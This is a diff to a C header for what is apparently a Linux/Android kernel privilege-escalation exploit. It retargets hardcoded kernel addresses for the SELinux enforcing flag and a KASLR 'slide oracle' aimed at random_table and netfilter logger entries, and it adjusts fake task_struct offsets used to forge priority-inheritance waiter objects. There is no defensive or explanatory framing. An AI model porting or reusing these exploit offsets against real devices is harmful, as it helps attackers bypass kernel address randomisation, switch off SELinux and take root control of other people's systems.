@@ -23,7 +23,7 @@
 #define ROOT_TASK_GROUP 0xffffff800a861e80ULL
 
 /* struct selinux_state begins with initialized, enforcing (two bools). */
-#define SELINUX_ENFORCING 0xffffff800a4cd001ULL
+#define SELINUX_ENFORCING 0xffffff800af06001ULL
 
 /*
  * The slide oracle repoints random_table[5].data at loggers[0][1].
@@ -31,7 +31,7 @@
  */
 #define SLIDE_NFULNL_LOGGER_IMAGE 0xffffff800a612e50ULL
 #define SLIDE_LOGGERS_0_1_IMAGE 0xffffff800a612d70ULL
-#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffff800a6a36c0ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffff800a90b680ULL
 #define P0_NFULNL_LOGGER_IMAGE_OFF \
   (SLIDE_NFULNL_LOGGER_IMAGE - KIMAGE_TEXT_BASE)
 
@@ -58,9 +58,9 @@
 #define FAKE_WAITER_PI_TREE_DEADLINE_OFF WAITER_DEADLINE_OFF
 
 /* Retail task_struct geometry from the paired build and live SLUB profile. */
-#define FAKE_TASK_USAGE_OFF 0x70
-#define FAKE_TASK_PRIO_OFF 0xb0
-#define FAKE_TASK_NORMAL_PRIO_OFF 0xb8
+#define FAKE_TASK_USAGE_OFF 0x68
+#define FAKE_TASK_PRIO_OFF 0xa8
+#define FAKE_TASK_NORMAL_PRIO_OFF 0xb0
 #define FAKE_TASK_TASK_GROUP_OFF 0x3e8
 #define FAKE_TASK_PI_LOCK_OFF 0x8c4
 #define FAKE_TASK_PI_WAITERS_OFF 0x8d0
